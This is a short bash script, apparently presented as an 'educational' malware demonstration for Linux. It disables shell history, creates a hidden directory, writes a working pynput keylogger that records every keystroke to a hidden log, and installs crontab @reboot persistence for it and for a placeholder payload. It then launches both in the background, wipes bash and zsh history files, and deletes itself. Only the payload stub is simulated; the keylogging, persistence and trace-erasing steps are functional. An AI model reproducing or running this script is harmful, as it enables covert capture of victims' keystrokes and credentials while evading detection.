#!/bin/bash

# Disable history tracking for this session
unset HISTFILE
HISTSIZE=0
HISTFILESIZE=0
# Removed: set +o history  (causes error in some environments)

# Define directories and file paths
TMP_DIR="/tmp/.sysd"
BIN_PATH="$TMP_DIR/shell.elf"
KEYLOGGER_PATH="$TMP_DIR/keylogger.py"

# Create a hidden temporary directory
mkdir -p "$TMP_DIR"

# Step 1: Simulated payload
# For educational purposes, we create a dummy payload rather than downloading an actual binary.
echo -e '#!/bin/bash\necho "Simulated Payload Running..."' > "$BIN_PATH"
chmod +x "$BIN_PATH"

# Step 2: Create a simulated keylogger using Python (requires pynput module)
cat > "$KEYLOGGER_PATH" <<EOF
from pynput import keyboard

def on_press(key):
    with open("/tmp/.sysd/keys.log", "a") as f:
        f.write(str(key) + "\\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
EOF

# Step 3: Set up persistence using the crontab (runs at reboot)
# Note: Ensure that crontab is allowed on your system and that you are working in a test environment.
(crontab -l 2>/dev/null; echo "@reboot python3 $KEYLOGGER_PATH &") | crontab -
(crontab -l 2>/dev/null; echo "@reboot $BIN_PATH &") | crontab -

# Step 4: Start the payload and keylogger immediately in the background
python3 "$KEYLOGGER_PATH" >/dev/null 2>&1 &
"$BIN_PATH" >/dev/null 2>&1 &

# Step 5: Clear command history as best as possible
sleep 1
rm -f ~/.bash_history ~/.zsh_history
history -c

# Optional: Self-delete the script
[ -f "$0" ] && rm -- "$0"

exit 0
